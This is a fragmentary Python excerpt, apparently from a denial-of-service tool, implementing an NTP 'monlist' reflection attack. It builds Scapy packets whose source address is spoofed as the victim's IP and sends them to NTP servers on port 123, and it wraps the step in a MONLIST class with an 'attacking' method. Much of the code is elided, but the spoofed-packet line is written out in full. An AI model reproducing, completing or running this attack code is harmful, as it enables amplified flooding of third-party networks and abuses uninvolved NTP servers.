...
def monlistize(ip, rounds, address_dict):
    n=0
            ...
            try:
                ...
                for j in ntp_d:
                    ...
                    if address_dict['start'] is not None:
                        ...
                        packet = IP(dst=j,src=ip)/UDP(sport=random.randint(address_dict['start'], address_dict['end']),dport=123)/Raw(load=data)
                    try:
...
class MONLIST(object):
    def attacking(self, target, rounds, address_dict):
        ...
        if ip == "127.0.0.1" or ip == "localhost":
            ...
            return
        monlistize(ip, rounds, address_dict) # attack with MONLIST using threading
